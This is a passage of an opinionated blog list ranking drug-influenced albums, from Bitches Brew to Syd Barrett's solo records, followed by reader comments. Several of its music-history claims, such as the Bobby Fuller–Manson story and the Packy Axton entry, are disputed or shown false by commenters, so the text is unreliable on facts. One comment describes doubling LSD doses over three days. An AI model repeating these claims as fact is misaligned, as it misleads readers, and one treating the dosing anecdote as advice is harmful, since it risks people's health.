The final studio album recorded by Drake, it is the only one of the three without a backing band, and the stripped-down quality of the songs palpably reflects his mental state at the time, one of harrowing depression. Drake overdosed on pills at age twenty-six, but left this album as a legacy, one mostly ignored at the time but now rightly regarded as brilliant– a collection of delicate and starkly personal statements that makes no concession to anything but simple expression and sheer despair.
43. Miles Davis – Bitches Brew
Here Davis purposely and irrevocably destroys his legacy as Cool Birther and icon of be-bop by recording an incendiary slice of rock-tinged funk jazz, replete with upper register wah-trumpet, John McLaughlin’s fusion licks, and enough pimp stroll overtones to soundtrack the entire output of Iceberg Slim. The fact that Davis was aware that Jimi Hendrix was repeatedly dalliancing with his wife (the Funk/Diva legend Betty Davis) must have had an affect on the direction of his groove. Or maybe it was just the heroin. In any case, this is an absolute monster of an album, an unrepentant middle finger to jazz snobs, and a down-on-the-corner statement that throbs and wobbles and ultimately refuses to resolve itself in any context. It’s one of the most towering musical statements of the 20th century, a composition of 70’s black street life, the madness, the drugs, the hustle, the humanity. This is Proust in eight sides, four albums, one vision.
42. Jeff Simmons – Lucille Has Messed My Mind Up
Former member of the Mothers of Invention, Simmons left to go record a pair of albums for the Straight label, Lucille being anything but. It sounds like every 15-year-old’s room in 1970–black lights, bongs, riffs, solos and Zap-boogie arrangements with plenty of guitar noodling to shore up the tweaked lyrics. This is the album I Dream of Jeannie would be humming to if she’d lived in a bong instead of a bottle.
41. Dead Boys – Young Loud and Snotty
Cleveland’s own answer to The Stooges and The New York Dolls, the Dead Boys were a dumber, drunker slice of the distorted NY thrash-cake. Featuring the rude spasm of Stiv Bators and Cheetah Chrome, this album was produced by Ten Wheel Drive’s Genya Ravan (formally of one of the first all-girl bands ever, Goldie and The Gingerbreads–real name: Goldie Zelkowitz). The Dead Boys owned CBGB for a while, trading on their combination of anthemic stupidity, surly brilliance, and rivers of cheap booze. Listening to this album is like soaking in bourbon-flavored Palmolive: an absolute joy.
40. Bobby Fuller – Let Her Dance
Most famous for the early-sixties hit “I Fought The Law”, which has been covered by every punk band in history, and which he originally recorded (but was actually written by Sonny Curtis–who wrote the theme to the Mary Tyler Moore Show), The Bobby Fuller Four’s “Let Her Dance” is a genius example of throwback fifties rock run through an echo chamber of surf-reverb. The effect is both intoxicating and disconcerting, like the best moments of being high in any context. Having once appeared in the movie The Ghost in the Invisible Bikini with Nancy Sinatra and Boris Karloff, Fuller was found dead in the front seat of his car, soaked in kerosene. It was initially ruled a suicide, but some people think he’d been taking acid the night before at a party with members of the Manson family, who ran away after almost being spotted burning an overdosed Fuller, in order to hide evidence of his death.
39. Legendary Pink Dots – Shadow Weaver
Producers of over 40 albums, this band, led by the magisterial Edward Ka-Spel, is a mix of Skinny Puppy, King Crimson, and a massive dose of tainted mescaline. Shadow Weaver itself is a tributary of prog-madness and lysergic atmospheres. “City of Needles”, “Leper Colony”, and “Ghosts of Unborn Children” are utterly demented and terrifying highlights.
38. Meat Puppets – Meat Puppets II
Listening to the Meat Puppets is like hanging onto the end of a length of cyclone fencing being swung in circles by your unstable older brother. No other band has ever captured the musical axis of evil (dueling country-fried guitar licks, heroin/punk sensibility and ghostly soprano vocals) quite as capably as the Kirkwood brothers. Legendary for their addictions, instability, and multiple rehabs, they still play like runaway geniuses. Curt Kirkwood sings like a wounded squirrel, his piercing warble the perfect compliment to the desert-inflected marching cowpunk anthems. Too High To Die would have been a fine choice for an album in this spot, but “Split Myself In Two” is such a perfect metaphor for drug lust/disgust that it could not be avoided.
37. Serge Gainsbourg – Rock Around The Bunker
This bizarre coke-fueled Nazi inflected rock drama is so drowning in weird intentions and barely understood metaphor that it’s like snorting a doomed line of Borax. Still, Gainsbourg’s smooth baritone and in-jokey French Asshole delivery totally delivers. One of the least scrutable albums ever recorded, the kind of thing that could only have made sense on the high wire of huit straight days of very, very expensive accelerants.
36. Elliott Smith – Either/Or
Elliott Smith died at age 34 of two stab wounds to the chest, which was ruled a suicide but is still inconclusive by many accounts. A heavy user of drugs and alcohol, as well as a sufferer of mental illness, Smith nevertheless put out six albums before his death, many of which are now acclaimed by cognoscenti as among the best of their generation. But it is Either/Or in which his greatest strengths and vulnerabilities are showcased. Using a spiderweb-thin delivery, over quavering and vulnerable chords, his songs are raw and simple and unusually affecting.
35. Bud Powell – The Amazing Bud Powell
The eccentrically brilliant co-inventor of bebop, and percussive rapid-tempo keyboard daredevil had already been committed to Bellevue by the time he recorded The Amazing, in which he can be regularly heard doing his signature growling and mumbling along with the rhythm. After being arrested for public drunkenness (during which he was likely sober and manic) and being beaten by the police, enforced electroshock therapy made him alternately violent and despondent. Soon after, his beloved brother Ritchie would be killed in the same car crash as the genius trumpet player Clifford Brown. Powell eventually died of TB and neglect, one of the greatest piano players of the twentieth century. This album is a legacy of his pain and brilliance.
34. The Libertines – The Libertines
A side of raw crack with a heroin chaser. An absolutely loathsome album in its oblivious self-involvement and rampant narcissism, and yet sort of a genius slab of pop drenched in undeniable hooks and hopeless dissipation. The studio tales are lurid, the tour debauchery even worse. Junkie lore in ’77 Detroit is one thing, white-Brit junkie 2003 with a side of Kate Moss is something else entirely. Still, “Can’t Stand Me Now” or “The Man Who Would Be King” pushed past third-form dorm angst and proved worth every ounce of navel gaze hatred.
33. Iggy Pop – Kill City
The musical equivalent of Death on the Installment Plan. Iggy in mental hospital for junk withdrawal. James Williamson takes over, who everyone hates, and starts barking orders. The absolute end of the Stooges, launch of Iggy solo, a memento of junk-trash-bravado, barely listenable but breathtaking in its nihilism and lack of talent. A pure historical statement: this is your band on drugs.
32. The Rolling Stones – Exile on Main Street
It is well known that Keith Richards shot a genuinely protean amount of heroin during the Stones’ debauched encampment at Ville Nellcoté in the south of France during the recording of Exile on Main Street. Gram Parsons spent a (un)healthy amount of time hanging about as well. It got so bad that Mick and Bianca rented an apartment a few hours away and only showed up to lay down the occasional track while the rest of the boys hung out in the basement practicing “Ventilator Blues” while waiting for Keith to rouse from his opiate coma long enough to fuck up another guitar line. And yet, somehow, Exile is by far the greatest Stones record, and one of the greatest rock records of all time–despite each and every note being dipped in pure molten poppy.
31. Johnny Thunders – So Alone
There are addicts, and then there are fiends. Johnny Thunders’ hero was Keith Richards, an emulation he took very seriously. Post-NY Dolls, his band the Heartbreakers were simultaneously a kickass rockabilly NY trash rock outfit as well as a traveling dimebag circus (add Jerry Nolan, minus Richard Hell, etc). And Johnny was the worst purveyor, both the lead-slinging hero and the stumbling shit-veined clown. So Alone features relatively crappy Ventures knockoffs (actually the Chantays) as well as Zappa-esque 50’s pop recreations and the reasonably affecting “You Can’t Put Your Arm Around a Memory.” This album is essentially a dried cotton ball, a clogged spike, a foul-smelling pair of leather pants left at the corner of Lexington and 53rd. His bizarre and relatively unexplained death in New Orleans only adds to the mystique of this excellent but reeking album.
30. Harry Nilsson and John Lennon – Pussy Cats
Notorious for his epic appetites, and justly lauded for his first few albums, 1974 found Harry Nilsson in the studio with friend and fellow debauchee John Lennon. The two had caroused at length around LA, regularly being kicked out of clubs and restaurants for absurd behavior, finally deciding to cut an album together. Nilsson, whose beautiful and delicate vocals had highlighted earlier releases, got into a coke-fueled competition with Lennon about who could scream their parts louder and ruptured a vocal cord. His voice was never the same. This album is one blurry inside joke after another, with unusual and surreal arrangements of songs from Jimmy Cliff to Bob Dylan that is steeped in a fortnight of hard drugs and harder lessons.
29. Shuggie Otis – Freedom Flight
Conceivably the most pleasantly baked album ever recorded. Funky, smooth, and with sweetwater vocals by Shuggie himself, son of strident bandleader Johnny Otis. Bad trip? This is your listen. Pot cookies and lemonade? You’re right there too. This is a Manhattan balcony, a sunny August, a mellow blunt, a cookout with pals, and a dalliance with horns. If a more chill album ever existed, especially before the word chill ever existed, I’d be terrified to hear it: you might be lulled into a short, blissful nap you’d never wake up from.
28. Suicide – Suicide
Without question one of the seminal albums of the 70’s, and possibly one of the greatest anti-rock opuses ever. Manhattan streets plus No Wave plus Jukebox Teardrop. You wanna take a swing by Deuce Avenue? Minimalism? Psychobilly? Yellow speed plus acid? Pure stoned synesthesia: genius. Also the third best album ever recorded to randomly ingest half of your mother’s medicine cabinet to.
27. James Ramey – The Baby Huey Story
At over 400 pounds and an unrepentant junkie, it’s not much of a surprise that Baby Huey died of a drug-related heart attack at the age of twenty-six. What is a surprise is how his sole album remains one of the best and most obscure slabs of funk recorded in the 70’s. With incredibly tight horn arrangements and a throbbing spine of a bass, Ramey’s truly raw and expressive voice carries each track well beyond the usual. What really propels the album though, in the end, is the other-worldly screech Ramey often released, part James Brown, part Grace Jones, part deeply wounded man. It pierces as it funks, skunking it’s way through high after dirty backbeat high.
26. Arthur Brown – The Crazy World of Arthur Brown
The God of Hellfire was a histrionic showman often lowered onstage by a rope wearing a flaming metal mask. Which sometimes required being doused by beer to keep from being badly burned. One of the few people ever kicked off of a tour with Jimi Hendrix for outlandishness and chemical excess, Brown continued to wear a colander on his head while reaping the royalties from the hit “Fire.” The rest of the album is a surprisingly sturdy blues rehash, stealing bits from James Brown and Screaming Jay Hawkins and then forcing them through a psychedelic mash of bravado and pure methanol.
25. Charles “Packy” Axton – Late Night Party
One of the kings of ’70’s Memphis and a driving force behind Stax records, Axton was also a hard-partying sax player whose tracks laid over the top of any number of grooving instrumentals that sound as if they were blown through a bottle of bourbon at 3am in the parking lot behind a mortuary off Beale Street. He more or less owned a very particular boozy groove later made popular by any number of different musicians, although he got little to no credit for it.
24. My Bloody Valentine – Loveless
When every vein in your body is packed with Robitussin and molten navel junk swirl. When every molecule in your body is an illegal one, a Kabul one, cut-with-strychnine buzz. Achingly beautiful drone, lush distorted lines piled on top of one another, almost whispered and gentle vocals, pistil meets stamen in front of a screeching Marshall stack. Some of the most beautiful music ever recorded.
23. Jeff Buckley – Grace
His musician-father Tim Buckley died at the height of his fame from an alcohol/heroin overdose. Jeff, apparently straight for most of his early career, was drinking and getting high regularly during the recording of this grittily opulent album, his second. Buckley’s multi-octave voice and tortured delivery sound like a mix between Robert Plant and Anthony and the Johnsons in a hot tub full of tequila. Buckley drowned after jumping into the Wolf River for a swim fully clothed and wearing work boots. There is much speculation as to whether it was intentional or not, but the beauty of these songs is unquestioned.
22. Arthur Russell – Springfield
Classically-trained cellist Russell moved to Manhattan in the early seventies and quickly ingratiated himself into the underground gay dance/electronica scene, wedding compositional minimalism with looped cello, poppers, crank, amyl, and disco backbeats–the result of which is an amazing and wholly original pastiche. Russell’s monotone and disaffected vocals ride above unusual arrangements to form songs that sound like nothing so much as aural cough syrup–heavy, twitchy, deep, stoned, genuinely beautiful.
21. The 13th Floor Elevators – 13th Floor Elevators
Truly a document of madness and mental disintegration. Roky Erikson was a notorious acid head in the Texan/Manson mold, and this album sounds like nothing so much as a very, very bad trip with enforced attendance at a dude ranch with barbed wire and collective meals and group prayer–not to mention bird-like vocals and strummy guitars and insane neck-stab snare hits. Apocalypse music.
20. James Booker– Spiders on The Keys
Without question the single best junkie, black, gay, one-eyed, patch-wearing, proto-genius keyboard monster piano player ever to come out of New Orleans, let alone the rest of the world. This album is so consistently flamboyant and resplendent with technique and junkie fuckups that it’s a primer in how to be great and high and greatly high at the same time. A colossal, wonderful mess.
19. The Brian Jonestown Massacre – Methodrone
Anton Newcombe, singer, guitar player, and mind behind BJM was a notorious junkie, crackpot, and dictator. Although he did once say “People talk about Eric Clapton. What has he ever done except throw his baby off a fuckin’ ledge and write a song about it?”, which I am inclined to agree with. This album is soaked in methadone, pot, alcohol, heroin, speed and unnecessary overdubs. Like Joe Stalin with a nose full. And yet, a semblance of genius. These songs bleed rehab and untethered desire.
18. Eddie “Smeero” Hazel – Games, Dames, and Guitar Thangs
Ah, god, is this album high. Hazel, architect of the greatest of Parliament/Funkadelic’s guitar solos, including the epic 10 minute intro to “Maggot Brain”, was more or less kicked out of the band due to his predilections and as a response recorded this genius slab of mess. Hazel-fuzz is like mother’s milk, one of the true gods of 70’s funk, unslakable thirst, and endless appetites.
17. Hasil Adkins – Peanut Butter Rock and Roll
Singlehandedly founded psychobilly, not to mention carving an entire career out of singing about hot dogs and Kentucky Fried Chicken, Adkins was a true madman, his songs barely on the verge of comprehension or sanity. Adkins died ten days after purposely being run over by an ATV in his front yard.
16. Cymande – Cymande
Happy, positive, full of amazing hooks and melodies, this island-jam pop-funk album is the distillation of the best joint you ever smoked, or a sticky drink with an umbrella in it being sipped at a poolside-bar. This is the talk down of every bad vibe, every bad acid trip, every argument with your wife about what to tip the bellboy. A skinny dip into the affirmative, high as a smiling, welcoming kite.
15. Joy Division – Closer
Lead singer Ian Curtis hung himself in his kitchen. It only gets darker and more grim from there. The soundtrack to ennui, tedium, enervation, malaise, lassitude, and Weltschmerz while somehow remaining vital and transformative. Like an iron lung full of despair, this is marching music, a parade of one through the Manchester back streets.
14. The Butthole Surfers – Locust Abortion Technician
Without question THE most terrifying album ever recorded, and purportedly done so at the tail end of oceans of cheap acid, this record, if played at correct volumes, can strip the paint off your ’83 Camry. Legendary Texas madman and insufferable genius Gibby Haynes lays it all on the line here, and then goes twelves steps over. I was once listening to “O-Men” on my headphones in a cubicle in college and the librarian came and tapped me on the shoulder and said “people are complaining about the frequencies coming from you.” Yes, that is a true story. I dare anyone to listen to “Kunts” at top volume, alone in a house at midnight, with all the lights off.
13. Billie Holiday – Lady Sings The Blues
Although this album is for some reason relatively well regarded, by 1956 Billie’s vocals had deteriorated badly due to a brutal touring schedule, along with heroin and alcohol abuse. Her performance here is gutty and raw, a professional vainly trying to deliver in the face of diminished skills, and it is unbearably sad. The elder Holiday, with seemingly full knowledge of the loss of nearly god-like vocal gifts, manages to grind through a slate of standards, and the one song that bears her writing credit, “God Bless the Child.” This album is a car wreck, unreflective of a lifetime of genius.
12. Neil Young – Trans
Sure, Neil was clean by the time this came out, and a better choice would have been Tonight’s the Night or On The Beach, both recorded under veils of heroin and U-Hauls full of cheap dirtweed even David Crosby wouldn’t smoke, but Trans is the choice because this is what happens after your brain is sodden with drugs: you buy a vocorder and make 1982’s best Kraftwerk cover album.
11. Love 666 –American Revolution
Heirs to a sludgey vein of post-MC5 grind, and purveyors of your aunt’s stolen blood pressure medication hoarded with half a six-pack of Malt Liquor, this tower of indifferent noise and silo-echo epitomizes an 80’s droning nihilism that wants to hunker in fields of corn, but trades scabs at the corner of 6th and Q instead.
10. Houndog – Houndog
A home-recorded slice of nothingness from Los Lobos’ David Hidalgo, this afterthought of a Latino blues side project is so utterly pot-drenched it smells like the carpet torn out of the back of a ’71 Ford Econoline, stored in Geezer Butler’s garage for twenty years, lent to Cyprus Hill to use as bong screens, and then sold to Jimmy Cliff’s niece for eighty bucks a square inch. It’s heavy, deep, brutally stoned, magnificently ruined.
9. Fleetwood Mac – Rumors
Tusk, which was brilliantly named after Mick Fleetwood’s nose, up which half of Peru was once snorted, is probably the wiser choice here. But Rumors, for all its great songwriting and Lindsay Buckingham’s truly brilliant guitar, is really the only option. Because not only is this 70’s juggernaut bathed in booze and coke, it is simultaneously drenched in the pain of broken relationships and illicit inter-band fucking.
8. Marvin Gaye – Here my Dear
Absolutely pulsating with the subliminal knowledge of the existence of an entire culture of people who don’t do cocaine and yet are somehow, inexplicably, reasonably happy. Still, there is transcendent soul to be sung, so why not, in the depths of withdrawal, sing it anyway? Full of naked guile and often so transparently duplicitous it’s painful, Here is a blatant ploy to get paid and get out of a contract, full of rote instrumentation and laughable keyboard fills. And yet, it’s a poignant crumbled-life confessional with some beautiful harmonies and naked lyrics.
7. Paul McCartney – McCartney II
It’s astonishing how stoned and demented this album is coming from the nice and respectable Beatle. Sounds like it was recorded in McCartney’s home studio after a thousand Meerschaum pipes of top-notch Turkish hashish and….turns out it was. Amazingly progressive in retrospect, this is a testament to late-night madness and access to very expensive recording equipment that occasionally sounds like Devo outtakes. If this album were released under someone else’s name, it would be hailed as one of the groundbreaking sides of the late 70’s. For Paul, though, it’s just an irreverent, baked mess.
6. Henry Rollins –
Each and every song is utterly drunk on sweaty men and barely sublimated homosexuality. I was at three different Rollins shows, all of them full of muscled skinheads who tried desperately to start a fight with me, all while watching cut Henry Rollins, wearing nothing but insanely small 70’s jogging shorts and a sweaty sixpack run through his set. It was only after I moved to San Francisco that I realized those skinheads were mostly angry about not being able to take a reflective moment and quietly admit to their heavily leathered brethren they were, in fact, pretty damn sweat-loving. They didn’t want to fight me, they wanted to take me out for an omelet. For deeply closeted muscle cases, moshing is speed dating, and gay is the drug that Dare Not Speak Its Name.
5. Royal Trux – Twin Infinitives
A dirty junkie laundry pile of an album. Husband and wife heroin team. The 90’s stuffed through a cheesecloth of Star Wars effects and unintelligible monkey groans. This record is so astonishingly fucked up that it’s amazing it ever got released, let alone widely reviewed. It’s a map of where not to go, what not to play, notes not to sing, effects not to use, and debauchery not to engage in. It’s a black suckhole of cigarette butts and shitty Ohio street dope. Only a fool with a phase pedal could think this was brilliance, and yet it is, because it’s so amazingly high that it’s like an Alan Lomax expedition into 1690’s Guyana. It’s pre-language. Pre-historic. A mewly babyfood mess of an album so far beyond stupid it’s awesome.
4. Lou Reed – The Blue Mask
The Velvet Underground’s White Light/White Heat would be a more expected, and perfectly legitimate choice for a template of heroin excess, especially since at those early shows Lou used to mime tying off onstage, injecting himself, and then handing the needle as a souvenier to a lucky audience member. But for my money Lou’s post-Velvets action is far more demented, wallowing as it does in just the brand of angry, lower Manhattan kink that only the man who recorded Metal Machine Music to prove the point that ultimate music was ultimately soulless could ever get away with.
3. Captain Beefheart – Trout Mask Replica
The holy grail of difficulty, an obscure, obtuse puzzle which takes no easy route, panders to no notion of form, consistently hits the opposite note we are trained to hear, and almost BEGS you to hate it. Hey, just about anyone can play “Brown Sugar” or “Norwegian Wood” on the guitar, and to their detriment, frequently do. It takes some serious hang-lows to play any of the tunes on this album. Or record them. Or release them. The musicianship is astonishingly good and original. The human brain is geared to fear and revile that which it cannot immediately process. What greater calling is there than to strive for an expression that triggers that reaction? What more worm-like calling is there than to salve that fear with what is safe and quickly understood? Any great work in any medium; literature, painting, dance, or sculpture, had to spend decades– or even generations– girding against public notions of propriety and the general malaise of the easily satisfied. It’s not unlikely, in forty years, that this album will be burned in the streets by hysterical mobs responding to a decree by the still-living but grimly calcified President Christie.
2. Chrome – Alien Soundtracks
Conceivably the greatest lo-fi album ever recorded, Alien Soundtracks is a total acid/speed mess, a collage of excellent riffs, sci-fi punk, pure sludge, verging-on-amphetamine psychosis, Burroughs-inspired cut up techniques, and inspired fuckoffery. It practically single handedly birthed the 90’s industrial movement. Helios Creed gave a number of interviews around the time of the release of this album in which he seemed to be under the impression that he was a flaming golden lion. He later admitted he’d been eating a lot of blotter. One of my favorite records of all time.
1. Syd Barrett – Madcap Laughs, Barrett
No other album was even considered for the top spot. Without question, this is the most raw, disturbing, and haunting entry on the list. So much so that both solo works had to be included. Syd Barrett left Pink Floyd in 1968 due to mounting instability and lysergic dissolution, but it’s because of his huddling pair of solo albums, Madcap Laughs and Barrett, that he appears here. This is broken music. Lost Thelonius. Way out on the coil. Completely untethered. But it’s also beautiful, transcendent, and truly childlike. The structureless quality of the songs, combined with improvised lyrics and jarring (but somehow perfect) rhythmic changes, tap into something elemental without making any effort to. These songs simply exist. It’s a sound bands have been laboring to achieve for half a century, but only Syd sounds like Syd. And even he only briefly did.

You did some heavy lifting here, my friend.
I’m sure anyone/everyone will have some quibbles, but it’s difficult to complain about anything considering the depth and breadth of your choices (I reckon a detour into Blues would have occupied several more, and of course Reggae is out of the question; or more importantly, most of the musicians would assert –quite rightly– that the herb is not a drug anyway).
My ONE beef is that, however obligatory and cliched, Black Sabbath *has* to be represented. While ‘Master of Reality’ is a no-brainer, one simply can’t leave of ‘Vol 4’, in part b/c the album was almost *named* ‘Snowblind’. And it’s not that they were using drugs (they were) or that the influence of the drugs is palpable (it is), it’s that they managed to ROCK THE EVERLOVING SHIT out of the joint, not remotely debilitated. Of course, they paid a price for that later, but that’s part of the rock and roll code.
All ostensible sins forgiven for having Syd where he belongs: at the top with no one even close to second place. And I say that with sadness, respect and awe.

You’re dead on about Black Sabbath, and the first album made my early list, but had to be culled because…well, I don’t remember now. As you can imagine, this list could easily have been 150 long, so there were some tough cuts. But Ozzy claims to have done acid every day for a year at some point in the late sixties, so it is indeed an oversight…

Maybe it’s best to leave them off, as if to say “DUH…” Like, Black Sabbath does not even warrant mention because it’s so obvious!
(Also: Love’s ‘Forever Changes’ is a crucial one for this list.)

It might be possible if you have access to enormous quantities. I had a very successful three days in a row once by doubling doses. Two on Friday, four Saturday, and eight Sunday morning just before falling asleep for the first time since Thursday night… I awoke a couple hours later, peaking again and in awe.
But a year? Yeah, the math doesn’t work for doubling. You’d be doing a billion hits at the end of your first month…

A brilliant article. I also found Butthole Surfers – Locust Abortion Technician incredibly haunting. My older brother used to play 22 going on 23 when we were teenagers and it’s echo through my parent’s house was fascinating and terrifying in equal measure. I read that Captain Beefheart recorded some of the material Trout Mask Replica by placing all the musicians in separate booths where they couldn’t hear or see each other.
Fantastic achievement and thoroughly good work. I’ve completely forgotten what I was meant to be working on and I am definitely going to track down McCartney II.

Also Guns and Roses are a bunch of corporate sissies, Syd Barret, 13th floor elevators, and Captain Beefheart were doing heavy shit like DMT. Not that I represent the white mans way of doing it, but it’s some heavy shit and should be respected for unlocking the secrets that were not meant to be known in a world of freebasing coke and doing acid.

I think you’re missing the point a bit. The weirdness of mental effects on drugs does not really get through on any of those artist’s records aside from maybe a technical ability standpoint. I’ll give you Pink Floyd and Thunders (who was mentioned), I guess, but it was the master of LSD tragedy, Barrett himself, who showed them that too much, is too much.

David,
Pink Floyd didn’t do a lot of drugs, contrary to popular belief, other than Syd Barrett. I could see Piper making the list but Barrett gets his on this list with his solo effort. I think Roger Waters has been quoted as saying he smoked some pot during the recording process and that was about it as far as drugs in the band through the 60’s and 70’s.

I have an interview with Roger saying that he took acid twice in the late 60s and 70s. Once, he said, was on a Greek island and it was idyllic and perfect (“I don’t know how much I took”). The second time he was in New York City and he went to a Smiler’s deli for a sandwich and a bottle of milk and, on his way back, he said, he stopped in the middle of the street and didn’t know what to do. That was his last time. The interview was from the early 90s.

Yeah, Packy Axton was dead by 1974 and didn’t have much influence on Stax except for a brief run with the Mar-Keys before getting kicked out of that band. He was a minor player whose mother owned the label. Cropper and Dunn and Jackson and Jones own that Memphis groove, not Axton. Hell, he didn’t even play on the Mar-Key’s biggest hit, “Last Night”. Finally, “Late Night Party” isn’t even an album available during his lifetime. It’s a compilation of mid 60s tracks put together in 2011 and I’m not sure any of them were initially released on Stax. So sure, Packy Axton as a king of 70s Memphis and driving force behind Stax when he released that compilation of non-Stax singles that came out in 2011 after he was dead. Furthermore, the Bobby Fuller Four never released an album called “Let Her Dance”. Seriously, I could fact check your entire article but I don’t have time. Caveat lector.

Something that should’ve been pointed out about the Nilsson/Lennon LP, especially since this is an article about the drugginess of the albums included on the list.
On the front cover, on the floor below Harry & John, you see:
1) A children’s block with the letter “D” on it.
2) A rug.
3) A children’s block with the letter “S” on it.
What does that spell kids?
DRUGS!

I agree with David above. Johnny Thunders “So Alone” has a cast of junkies that definitely rivals any other work ever recorded. Just look at the cast members:
Peter Perrett of The Only Ones, Phil Lynott of Thin Lizzy, Steve Jones of The Sex Pistols, Steve Marriott of Humble Pie, etc.
The most heroin-y LP of all-time.

Exile On Main Street is an obvious choice, but as the best Stones album of all time over Sticky Fingers, Let It Bleed, Beggars Banquet, or even Some Girls or Aftermath? I don’t think so. And Beefheart was taking the piss on Trout Mask Replica, as he said many times afterward. He deliberately set out to make the shittiest album possible, hoping that *exactly* the same people who hail it as a masterpiece would buy into it. Listen to, oh, I don’t know, *anything* else in his catalog if you don’t get that the joke is on fans of the album.

Great list, and I’m not going to chide you for any of your selections. But as for “After Midnight,” your timeline is a bit off. Clapton’s version preceded Cale’s “Naturally” LP by a year (1970). The song itself was known to Clapton, as Cale had released an earlier version during his brief recording career with Liberty Records in mid 60s. Indeed, Cale was about to “give it up” before Clapton had his hit of the song, which helped JJ get signed to Shelter Records.

It may not be the bestest but I like it plenty. Second and more seriously, in your bit on Neil Young’s “On The Beach” you point out movies and popcorn song references, but that’s the song “Speakin’ Out” which is on the even more drug addled “Tonight’s The Night” which came out a year after “On The Beach”.

That being said, 1994’s Transmissions From The Satellite Heart is one of the best psychedelic albums of all-time.

Agree completely, Middleman. The 1960’s were over, and we lost the Family Stone. You can hear the existential pain of Sly’s broken dream of achieving human harmony through music. Becoming uncomfortably numb as the walls of addiction close around him, battling cynicism, reminding himself that he’s still a songwriter and a poet, and proving it to everyone who will listen with songs of vulnerable beauty like “Smiling”, “Family Affair”, and “Runnin Away”.

The Bobby Fuller/Manson connection is fiction from the book Dead Circus. Manson was in prison in 1966 and had nothing to do with Bobby Fuller or his death. No doubt since there’s a Dead Circus film (been in the works since at least 2010) more people are going to believe this as fact soon. The Manson family did not exist in 1966. It was Bob Keane who suggested that Bobby died at a party and a bunch of celebrities left him in the car to look like suicide which is probably one of the wackiest ideas ever considered.
The Grateful Dead is a big omission. Honestly I’m surprised nobody in the comments mentioned them either. The first album and their early material is really good. The 13th Floor Elevators and the Grateful Dead were the only bands I can think of that were serious about taking LSD and performing on it live back then.
Tommy Hall’s influence in the 13th Floor Elevators is overshadowed by Roky. He wrote a good deal of the songs.

Fun read. I’d think “Dopesmoker” would be an obvious inclusion, but maybe that’s a bit too on the nose. My personal addition would be pretty much anything by Eyehategod – take this anecdote from the recording of “Dopesick”:
Mike Williams had attempted to record the sound of smashing glass for the introduction to the album, by smashing a bottle on the floor of the studio. In the process he slashed his hand open badly and bled all over the studio floor (this recording did make it to the record as the introduction to the first track, “My Name is God (I Hate You)”). One of the band members then apparently smeared the words “Hell” and “Death to Pigs” in Mike’s blood.
Also, when I saw them, Mike Williams was too fucked up to sing about a third of the way through, and the drummer was definitely on some serious uppers, because he completely ignored it and kept playing with the biggest most self-satisfied grin ever for about another hour.

He’s a wanna-be intellectual, but he doesn’t have the insight for it; he’s just got the attention seeking gene.

I just remember thinking, “This is the last band I would want to hear if I was tripping on acid.” I love psychedelic music, albeit from a different (younger) generation. They sounded like a bunch of old stoned hillbillies to me. The best part of the show was “Space”, where the sound guys tweak a bunch of effects in between sets. I just don’t get it, but I have a better understanding of the power of suggestion and mass hysteria. As for Chrome, I knew Helios when I lived in SF. That MoFo is all kinds of crazy, but a nice guy. I was glad to see him high on the list.

Grateful Dead good live band to trip to says:	
October 29, 2016 at 7:22 pm	
Why the fuck do you call thousands of grown-up people tripping on shrooms and lsd and hearing a psychedelic quality in a certain kind of music a form of mass hysteria instead of mass psychedelia? You could argue any massive congregation of intoxicated persons is a form of hysteria if that’s your attitude.
There is a definite “group” experience at the Dead concerts, but it’s fucking cool. Doesn’t feel hysterical in the least. It’s just peaceful and beautiful and enjoyable. The group experience is based on the combination of tripping hard, letting the music take you for a ride and the unusual reality of being around other fully grown adults tripping their brains out who also happen to be enjoying the music in a similar way you are enjoying it.
There is a sense of bonding with other people for obvious and good reasons. The bonding causes a brotherhood emotion that is powerful enough that people who aren’t tripping can feel it. The psychedelic vibration is so chill that the police and security seem to completely accept the use of drugs and bust zero balls.
Also, it’s the only concert I’ve ever been where the fucking usher to my section started crying because he felt the “mass hysteria” moving him.
I like a lot of Grateful Dead songs, love a few songs, but I had found their style of live jamming fairly boring while sober. When I heard it in the psychedelic state the way my brain translated it was completely different and it was fucking uncanny how the music fit with the drugs.
The long jams seduced and lulled and then the chorus hit, drawing me back in completely, deeply. Often time the chorus had a phrase that hit emotionally. And it sounds more like soulful outerspace music than yodeling hillbillies or whatever pejorative you tossed at them (as if stoned hillbillies are a problem).
Sometimes the Dead will repeat the chorus over and over. This is not something that would stimulate me while sober, but under the influence of psychedelic drugs the repetition has a profundity to it, like they are hammering home the point.
“He’s never coming back” was the chorus that hit me hardest at the Dead and Co. show I saw this summer. It made me think of people who have left Earth who I love. Bob Weir kept saying it and saying it and the melody and the sound was so touching.
That actually made me break down. They’re never coming back. It’s a part of reality. One we don’t fully grapple with…but in a psychedelic mind most people are able to contemplate and feel those profound aspects of life.

There were also a cluster of albums in the 80s by out there bands such as 23 Skidoo, Psychic TV, etc., that were hard to listen to — and probably to record! — if one wasn’t on something … something strong.

I totally disagree on Kill City
#1 It was only Iggy and James and no other Stooges, just studio musicians
#2 Iggy was in the mental hospital because that’s what detox was in 1975
#3 James had the nickname “Straight James” because he was basically straight
The album is more a reflection on Iggy’s ’72-’74 Stooges craziness

From what I’ve read about James Williamson’s time in The Stooges, his nickname ‘straight’ was ironic; as in “compared to Iggy I’m straight”.

I agree with a bunch of these, but am a little annoyed by the lack of any of the Dead’s first three albums… They were essentially made on acid, as well as quite a bit of coke through the 70s.
Also, I know not that many people listen to Phish, but jesus christ… Round Room by Phish is insanely drugged up (As well as Undermind). 3/4 of the band had various drug problems especially Trey (guitar) who was in the midst of being addicted to tons of types of pills and alcohol.

Damn man that is pretty pretentious of you. This list was a person’s opinion… their taste in music. There aren’t any right or wrong answers. (As a few others have mentioned, the only real problem I have were the numerous glaring errors throughout… Not the biggest deal, but it certainly leaves your list feeling a little weak when you notice incorrect “facts” stated about half the albums. I guess that and a few odd choices for certain bands/ artists- like picking Heroes by Bowie… based on your criteria for this list it seems like the obvious choices would be either Station to Station, which you apparently just don’t like but was created by a man stuck in such a depraved state of cocaine addiction that he doesn’t even remember making the album, or probably my pick would be his next album Low. He had just gotten clean when making Low and was clearly fragile and in a unique head space. It just seems odd to choose Heroes instead of Low if you are going for a “detoxed” album. And of course a few other albums such as Young Americans and Diamond Dogs would make fine choices… much better than Heroes. But I digress…
Oh…. also Either/Or by Elliott Smith… that’s an interesting choice.
